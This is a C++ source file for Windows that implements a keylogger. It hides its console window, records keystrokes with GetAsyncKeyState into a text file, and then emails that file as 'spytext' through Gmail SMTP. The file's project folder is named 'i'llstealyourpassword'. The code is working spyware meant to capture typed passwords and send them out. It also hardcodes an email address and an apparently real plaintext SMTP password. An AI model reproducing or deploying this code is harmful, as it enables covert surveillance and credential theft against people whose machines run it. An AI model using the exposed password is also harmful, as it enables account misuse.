#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include <tchar.h>
#include <io.h>

#include "EASendMailObj.tlh"
using namespace EASendMailObjLib;
using namespace std;

const int ConnectNormal = 0;
const int ConnectSSLAuto = 1;
const int ConnectSTARTTLS = 2;
const int ConnectDirectSSL = 3;
const int ConnectTryTLS = 4;



void EscribirArchivo(LPCSTR texto)
{
    ofstream archivo;
    archivo.open("texto.txt", fstream::app);
    archivo << texto;
    archivo.close();
}

bool TeclasPulsadas(int tecla)
{
    switch (tecla)
    {
    case VK_SPACE:
        cout << " ";
        EscribirArchivo(" ");
        break;
    case VK_RETURN:
        cout << "\n";
        EscribirArchivo(" {INTRO} ");
        break;
    case VK_SHIFT:
        cout << " {SHIFT} ";
        EscribirArchivo(" {SHIFT} ");
        break;
    case VK_BACK:
        cout << " {RETROCESO} ";
        EscribirArchivo(" {RETROCESO} ");
        break;

    default: return false;
    }
}

int main(int argc, _TCHAR* argv[])
{
    FreeConsole();
    unsigned char key;
    int count_keys = 0;
    while (true)
    {
        if (count_keys >= 100)
            break;
        Sleep(10);
        for (key = 8; key <= 255; key++)
        {
            if (count_keys >= 100)
                break;
            if (GetAsyncKeyState(key) == -32767)
            {
                if (TeclasPulsadas(key) == FALSE)
                {

                    cout << key;
                    ofstream archivo;
                    archivo.open("texto.txt", fstream::app);

                    archivo << key;
                    archivo.close();
                    count_keys++;
                    cout << "wrote key " << count_keys << endl;

                }

            }
            
        }
        
    }

    //sending spy text on email
    cout << "yes" << endl;

    ::CoInitialize(NULL);

    IMailPtr oSmtp = NULL;
    oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
    oSmtp->LicenseCode = _T("TryIt");

    // Set your sender email address
    oSmtp->FromAddr = _T("vikidobryden@gmail.com");
    // Add recipient email address
    oSmtp->AddRecipientEx(_T("vikidobryden@gmail.com"), 0);

    // Set email subject
    oSmtp->Subject = _T("spytext");
    // Set email body
    oSmtp->BodyText = _T("entered symbols:");
    // Add attachment from local disk
    if (oSmtp->AddAttachment(_T("C:\\Users\\vikid\\source\\repos\\i'llstealyourpassword\\i'llstealyourpassword\\texto.txt")) != 0)
    {
        _tprintf(_T("Failed to add attachment with error: %s\r\n"),
            (const TCHAR*)oSmtp->GetLastErrDescription());
    }

    // Your SMTP server address
    oSmtp->ServerAddr = _T("smtp.gmail.com");

    // User and password for ESMTP authentication, if your server doesn't
    // require User authentication, please remove the following codes.
    oSmtp->UserName = _T("vikidobryden@gmail.com");
    oSmtp->Password = _T("DobrydenVictoriaAndriivna2002");

    // Most mordern SMTP servers require SSL/TLS connection now.
    // ConnectTryTLS means if server supports SSL/TLS, SSL/TLS will be used automatically.
    oSmtp->ConnectType = ConnectTryTLS;




    // If your SMTP server requires SSL/TLS connection on 25/587/465 port
    oSmtp->ServerPort = 465; // 25 or 587 or 465
    oSmtp->ConnectType = ConnectSSLAuto;

    _tprintf(_T("Start to send email ...\r\n"));

    if (oSmtp->SendMail() == 0)
    {
        _tprintf(_T("email was sent successfully!\r\n"));
    }
    else
    {
        _tprintf(_T("failed to send email with the following error: %s\r\n"),
            (const TCHAR*)oSmtp->GetLastErrDescription());
    }
   
    return 0;
}
